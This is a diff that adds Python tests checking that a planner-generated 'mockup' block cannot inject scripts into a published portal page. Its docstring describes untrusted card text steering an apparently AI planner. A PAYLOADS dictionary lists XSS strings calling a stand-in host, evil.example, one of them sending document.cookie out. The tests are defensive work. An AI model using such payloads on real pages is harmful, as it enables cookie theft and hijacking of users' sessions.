@@ -486,6 +486,104 @@ class RenderTest(unittest.TestCase):
         self.assertIn("DRE-2718", html)
 
 
+class MockupIsNotAnInjectionChannelTest(unittest.TestCase):
+    """The mockup fence is the ONE place the artifact emits markup rather than
+    escaped text — so it is the one place an injection could land.
+
+    The chain is real: the epic body is untrusted (standards/untrusted-content.md
+    treats card text as steerable data), the planner turns it into the mockup,
+    and the run publishes that to a portal page the CEO opens in a browser. The
+    portal's own "Add document" button strips scripts for exactly this reason;
+    this path must not be the way around it.
+
+    A mockup only needs to be STYLED by real tokens, not to execute. So markup
+    passes through, scripting does not — and the check names what it stripped
+    rather than sanitizing in silence.
+    """
+
+    def _mockup(self, inner: str) -> str:
+        return ARTIFACT_V1.replace(
+            "Not applicable — this epic ships no UI.",
+            "The lane, as it will look.\n\n```mockup\n"
+            f'<div style="background: var(--surface)">{inner}</div>\n```',
+        )
+
+    # Each payload is a way a published page could run attacker markup.
+    PAYLOADS = {
+        "script tag": "<script>fetch('https://evil.example/'+document.cookie)</script>",
+        "event handler": "<img src=x onerror=\"fetch('https://evil.example')\">",
+        "javascript url": "<a href=\"javascript:fetch('https://evil.example')\">go</a>",
+        "iframe": "<iframe src=\"https://evil.example\"></iframe>",
+        "object": "<object data=\"https://evil.example/x.swf\"></object>",
+        "svg onload": "<svg onload=\"fetch('https://evil.example')\"></svg>",
+        "style expression": "<div style=\"width: expression(alert(1))\">x</div>",
+        "form action": "<form action=\"https://evil.example\"><input name=q></form>",
+    }
+
+    def test_no_payload_survives_into_the_page(self):
+        pa = _pa()
+        for label, payload in self.PAYLOADS.items():
+            with self.subTest(payload=label):
+                html = pa.render(self._mockup(payload), "DRE-2668")
+                # The mockup region, where the markup passes through.
+                region = html.split('id="visual-model-mockup"', 1)[1] \
+                             .split("</section>")[0]
+                for marker in ("<script", "onerror", "onload", "javascript:",
+                               "<iframe", "<object", "expression(", "<form"):
+                    self.assertNotIn(
+                        marker, region,
+                        f"{label}: {marker!r} reached the published page",
+                    )
+                # And nowhere on the page does the attacker's host survive,
+                # escaped or not — a dropped tag must take its text with it.
+                self.assertNotIn("evil.example", html, label)
+
+    def test_a_payload_is_a_check_defect_not_a_silent_strip(self):
+        # Silently sanitizing would leave the planner believing the mockup it
+        # wrote is what the CEO sees. The run says what it refused.
+        pa = _pa()
+        for label, payload in self.PAYLOADS.items():
+            with self.subTest(payload=label):
+                found = pa.defects(self._mockup(payload), ui=True)
+                self.assertTrue(
+                    any("mockup" in d.lower() for d in found),
+                    f"{label} must be a defect, got {found}",
+                )
+
+    def test_ordinary_mockup_markup_still_renders_live(self):
+        # The gate must not be so blunt that a real mockup stops working —
+        # that is how a safety check gets deleted.
+        html = _pa().render(UI_ARTIFACT, "DRE-2668")
+        self.assertIn('<button style="background: var(--accent)">', html)
+        self.assertIn("Groom", html)
+        self.assertEqual(_pa().defects(UI_ARTIFACT, ui=True), [])
+
+    def test_a_clean_mockup_keeps_its_structure_and_tokens(self):
+        pa = _pa()
+        clean, removed = pa.sanitize_mockup(
+            '<div class="lane" style="background: var(--surface)">'
+            '<img src="logo.svg" alt="logo"><a href="#kpis">KPIs</a></div>'
+        )
+        self.assertEqual(removed, [])
+        for kept in ('class="lane"', "var(--surface)", 'src="logo.svg"',
+                     'href="#kpis"', "<img", "<a "):
+            self.assertIn(kept, clean)
+
+    def test_the_page_forbids_script_execution_outright(self):
+        # Defence in depth: even a hole in the allowlist cannot execute.
+        html = _pa().render(UI_ARTIFACT, "DRE-2668")
+        self.assertIn("Content-Security-Policy", html)
+        self.assertIn("script-src 'none'", html)
+
+    def test_the_kpi_data_survives_the_policy(self):
+        # The close-out reads the numbers off the published page, so the
+        # policy must not cost us the JSON block.
+        html = _pa().render(UI_ARTIFACT, "DRE-2668")
+        payload = html.split('id="kpi-data"', 1)[1].split(">", 1)[1] \
+                      .split("</script>")[0]
+        self.assertEqual(len(json.loads(payload)), 2)
+
+
 class CliTest(unittest.TestCase):
     """The workflow drives this by CLI — exit codes and stdout are contract."""
 
